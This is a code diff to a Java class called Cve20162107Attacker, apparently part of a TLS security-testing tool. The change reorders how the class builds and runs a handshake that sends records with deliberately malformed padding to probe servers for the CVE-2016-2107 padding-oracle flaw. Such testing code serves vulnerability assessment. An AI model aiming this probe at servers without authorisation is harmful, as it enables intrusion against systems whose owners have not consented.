@@ -70,17 +70,15 @@ public class Cve20162107Attacker extends Attacker<Cve20162107CommandConfig> {
         tlsConfig.setEnforceSettings(true);
         tlsConfig.setHighestProtocolVersion(version);
         LOGGER.info("Testing {}, {}", version.name(), suite.name());
-        tlsConfig.setWorkflowTraceType(WorkflowTraceType.HANDSHAKE);
         TlsContext tlsContext = new TlsContext(tlsConfig);
-        WorkflowExecutor workflowExecutor = WorkflowExecutorFactory.createWorkflowExecutor(tlsConfig.getExecutorType(),
-                tlsContext);
 
-        WorkflowTrace trace = tlsContext.getWorkflowTrace();
+        WorkflowTrace trace = new WorkflowConfigurationFactory(tlsConfig).createHandshakeWorkflow();
         SendAction sendAction = trace.getFirstConfiguredSendActionWithType(HandshakeMessageType.FINISHED);
         // We need 2-3 Records,one for every message, while the last one will
         // have the modified padding
         List<AbstractRecord> records = new LinkedList<>();
         Record record = createRecordWithBadPadding();
+        tlsConfig.setCreateIndividualRecords(true);
         records.add(new Record(tlsConfig));
         if (sendAction.getConfiguredMessages().size() > 2) {
             records.add(new Record(tlsConfig));
@@ -96,6 +94,10 @@ public class Cve20162107Attacker extends Attacker<Cve20162107CommandConfig> {
         List<ProtocolMessage> messages = new LinkedList<>();
         messages.add(alertMessage);
         action.setConfiguredMessages(messages);
+        tlsConfig.setWorkflowTrace(trace);
+        WorkflowExecutor workflowExecutor = WorkflowExecutorFactory.createWorkflowExecutor(tlsConfig.getExecutorType(),
+                tlsContext);
+
         try {
             workflowExecutor.executeWorkflow();
         } catch (WorkflowExecutionException ex) {
